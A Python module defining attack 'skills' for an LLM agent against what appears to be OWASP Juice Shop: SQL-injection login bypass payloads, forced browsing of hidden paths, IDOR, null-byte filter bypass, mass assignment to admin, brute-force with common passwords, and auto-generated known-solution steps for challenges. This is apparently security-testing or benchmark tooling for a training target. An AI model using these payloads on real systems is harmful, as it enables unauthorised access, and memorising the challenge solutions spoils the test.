"""Skill library: built-in generic skills + auto-generated from CHALLENGE_HINTS."""
from __future__ import annotations

from .hints import CHALLENGE_HINTS
from .base import Skill, SkillStep

# ═══════════════════════════════════════════════════════════════════
#  Generic reusable skills (LLM fills in the parameters)
# ═══════════════════════════════════════════════════════════════════

SQLI_LOGIN_BYPASS = Skill(
    name="sqli_login_bypass",
    description="SQL injection to bypass login authentication for a target user. Common payloads: ' OR 1=1--, admin'--, user@email'--",
    category="injection",
    params_schema={"email_payload": "SQL injection payload for the email field (e.g. ' OR 1=1--, bender@juice-sh.op'--)"},
    steps=[
        SkillStep(
            action="http_request",
            params={
                "method": "POST",
                "path": "/rest/user/login",
                "body": {"email": "{email_payload}", "password": "x"},
            },
            expect_status=200,
            extract={"token": "authentication.token"},
        ),
    ],
)

FORCED_BROWSING = Skill(
    name="forced_browsing",
    description="Access a specific path/endpoint that should be restricted or hidden. Known paths: /ftp/, /metrics, /api-docs/, /encryptionkeys/, /support/logs/",
    category="forced_browsing",
    params_schema={"path": "The target path to access (e.g. /ftp/secret.md)"},
    steps=[
        SkillStep(
            action="http_request",
            params={"method": "GET", "path": "{path}"},
        ),
    ],
)

PARAMETER_TAMPERING = Skill(
    name="parameter_tampering",
    description="Send a request with tampered/manipulated parameters to exploit weak server-side validation",
    category="parameter_tampering",
    params_schema={
        "method": "HTTP method (POST/PUT/PATCH)",
        "path": "Target API endpoint",
        "body": "The tampered request body as a JSON object",
    },
    steps=[
        SkillStep(
            action="http_request",
            params={"method": "{method}", "path": "{path}", "body": "{body}"},
        ),
    ],
)

IDOR_ACCESS = Skill(
    name="idor_access",
    description="Access another user's resource via Insecure Direct Object Reference",
    category="idor",
    params_schema={"path": "The target resource path (e.g. /rest/basket/2)"},
    requires_auth="user",
    steps=[
        SkillStep(
            action="http_request",
            params={"method": "GET", "path": "{path}", "inject_auth": True},
        ),
    ],
)

NULL_BYTE_BYPASS = Skill(
    name="null_byte_bypass",
    description="Access a restricted file using null byte injection to bypass extension filters. Encode null byte as %2500 (e.g. /ftp/file.bak%2500.md)",
    category="forced_browsing",
    params_schema={"path": "Path with null byte encoded as %2500 (e.g. /ftp/file.bak%2500.md)"},
    steps=[
        SkillStep(
            action="http_request",
            params={"method": "GET", "path": "{path}"},
        ),
    ],
)

MASS_ASSIGNMENT = Skill(
    name="mass_assignment",
    description="Register a new user with extra fields (like role=admin) to exploit mass assignment",
    category="mass_assignment",
    params_schema={
        "email": "Email for the new user",
        "password": "Password for the new user",
        "extra_fields": "Extra fields to inject (e.g. {\"role\": \"admin\"})",
    },
    steps=[
        SkillStep(
            action="register_user",
            params={
                "email": "{email}",
                "password": "{password}",
                "role": "admin",
            },
        ),
    ],
)

BRUTE_FORCE_LOGIN = Skill(
    name="brute_force_login",
    description="Try logging in with a known email and a common password. Common passwords: admin123, ncc-1701, password, 12345",
    category="brute_force",
    params_schema={
        "email": "Target email address",
        "password": "Password to try",
    },
    steps=[
        SkillStep(
            action="login",
            params={"email": "{email}", "password": "{password}"},
        ),
    ],
)

# ── All generic skills ───────────────────────────────────────────

GENERIC_SKILLS: dict[str, Skill] = {
    s.name: s
    for s in [
        SQLI_LOGIN_BYPASS,
        FORCED_BROWSING,
        PARAMETER_TAMPERING,
        IDOR_ACCESS,
        NULL_BYTE_BYPASS,
        MASS_ASSIGNMENT,
        BRUTE_FORCE_LOGIN,
    ]
}


# ═══════════════════════════════════════════════════════════════════
#  Auto-generate challenge-specific skills from CHALLENGE_HINTS
# ═══════════════════════════════════════════════════════════════════

def _generate_challenge_skills() -> dict[str, Skill]:
    """Convert each CHALLENGE_HINTS entry into a zero-param Skill."""
    skills: dict[str, Skill] = {}
    for key, hint in CHALLENGE_HINTS.items():
        steps: list[SkillStep] = []
        for step_data in hint.get("steps", []):
            method = step_data.get("method", "GET")

            if method == "browser_navigate":
                params: dict = {"path": step_data["endpoint"]}
                steps.append(SkillStep(action="browser_navigate", params=params))
            else:
                params = {
                    "method": method,
                    "path": step_data["endpoint"],
                }
                body = step_data.get("body")
                if body is not None:
                    params["body"] = body
                query_params = step_data.get("params")
                if query_params is not None:
                    params["params"] = query_params
                steps.append(SkillStep(action="http_request", params=params))

        skill_name = f"solve_{key}"
        skills[skill_name] = Skill(
            name=skill_name,
            description=f"Known solution for '{key}' using {hint.get('approach', 'unknown')}",
            category=hint.get("approach", "unknown"),
            steps=steps,
            requires_auth=hint.get("requires_auth"),
        )
    return skills


CHALLENGE_SKILLS: dict[str, Skill] = _generate_challenge_skills()


# ═══════════════════════════════════════════════════════════════════
#  Merged registry
# ═══════════════════════════════════════════════════════════════════

ALL_SKILLS: dict[str, Skill] = {**GENERIC_SKILLS, **CHALLENGE_SKILLS}


def get_skill(name: str) -> Skill | None:
    """Look up a skill by name."""
    return ALL_SKILLS.get(name)


def list_skills() -> list[dict[str, str]]:
    """Return a summary of all available skills for the LLM prompt."""
    result = []
    for name, skill in ALL_SKILLS.items():
        entry: dict[str, str] = {
            "name": name,
            "description": skill.description,
            "category": skill.category,
        }
        if skill.params_schema:
            entry["params"] = ", ".join(
                f"{k}: {v}" for k, v in skill.params_schema.items()
            )
        else:
            entry["params"] = "(no params needed — pre-configured)"
        if skill.requires_auth:
            entry["requires_auth"] = skill.requires_auth
        result.append(entry)
    return result
